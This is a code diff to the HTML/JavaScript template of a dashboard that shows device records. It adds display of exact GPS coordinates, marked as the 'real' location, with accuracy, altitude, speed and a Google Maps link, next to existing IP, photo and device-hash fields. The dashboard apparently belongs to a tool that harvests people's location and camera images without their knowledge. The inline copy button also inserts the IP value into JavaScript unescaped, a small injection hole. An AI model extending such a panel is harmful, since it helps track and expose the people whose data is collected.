@@ -594,12 +594,27 @@
                             <span class="lbl">Lang / TZ</span>
                             <span class="val">${d.language || 'N/A'} · ${d.timezone || 'N/A'}</span>
                         </div>
+                        ${d.latitude ? `
+                        <div class="divider"></div>
+                        <div class="section-label">🎯 GPS Location (Real)</div>
+                        <div class="info-row">
+                            <span class="ico">📍</span>
+                            <span class="lbl">Coords</span>
+                            <span class="val" style="color:#00ff88;font-family:monospace;font-size:.73rem">${Number(d.latitude).toFixed(6)}, ${Number(d.longitude).toFixed(6)}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="ico">🎯</span>
+                            <span class="lbl">Accuracy</span>
+                            <span class="val">${d.accuracy ? '±'+d.accuracy+'m' : 'N/A'}${d.altitude ? ' · Alt: '+d.altitude+'m' : ''}${d.speed ? ' · Speed: '+d.speed+' m/s' : ''}</span>
+                        </div>
+                        ` : ''}
                     </div>
 
                     ${photosHTML}
 
                     <div class="card-footer">
                         ${mapsIP  ? `<a class="map-btn" href="${mapsIP}"  target="_blank" rel="noopener">🌐 IP Map</a>` : ''}
+                        ${d.latitude ? `<a class="map-btn" href="https://maps.google.com/?q=${d.latitude},${d.longitude}" target="_blank" rel="noopener" style="background:rgba(0,255,136,0.12);color:#00ff88;border-color:rgba(0,255,136,0.2)">🎯 GPS Map</a>` : ''}
                         <button class="copy-btn" onclick="copyToClipboard('Device: ${modelEsc} | Hash: ${hashEsc} | IP: ${d.ip||''}')">📋 Copy All</button>
                     </div>
                 </div>`;
